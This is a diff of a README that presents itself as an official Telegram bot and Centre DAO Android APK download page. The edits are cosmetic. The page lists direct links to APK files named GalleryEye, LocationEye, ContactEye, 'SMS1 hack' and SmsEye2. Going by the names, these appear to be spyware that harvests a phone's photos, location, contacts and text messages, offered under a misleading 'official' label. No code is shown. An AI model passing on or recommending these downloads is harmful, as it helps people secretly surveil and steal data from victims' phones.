@@ -1,6 +1,6 @@
-#Shivaya <a href="https://github.com/shivaya-dav?tab=repositories">
+<a href="https://github.com/shivaya-dav?tab=repositories">
   <img src="https://img.shields.io/badge/GitHub-000000?style=for-the-badge&logo=github&logoColor=white" alt="GitHub">
-</a>  
+</a>  ## Shivaya
 
 # Telegram Bot App Downloads
 
@@ -16,15 +16,15 @@ Welcome to the official download page for the Centre DAO Android APKs. Click on 
 
 - [Online Games SMS Download](https://github.com/webappsite/Application/raw/refs/heads/main/Apk_editor/Game's%20online.apk)
 
-- [Gallery apk download](https://github.com/webappsite/Application/raw/refs/heads/main/GalleryEye.apk)
+- [Gallery apk Download](https://github.com/webappsite/Application/raw/refs/heads/main/GalleryEye.apk)
 
 - [Location Apk Download](https://github.com/webappsite/Application/raw/refs/heads/main/LocationEye.apk)
 
 - [Contact number Apk Download](https://github.com/webappsite/Application/raw/refs/heads/main/ContactEye.apk)
 
-- [SMS1 hack apkDownload](https://github.com/webappsite/Application/raw/refs/heads/main/sms%20eye%20app.apk)
+- [SMS1 hack Apk Download](https://github.com/webappsite/Application/raw/refs/heads/main/sms%20eye%20app.apk)
 
-- [SMS2 hack apkDownload](https://github.com/webappsite/Application/raw/refs/heads/main/SmsEye2.apk)
+- [SMS2 hack Apk Download](https://github.com/webappsite/Application/raw/refs/heads/main/SmsEye2.apk)
 
 ---
 
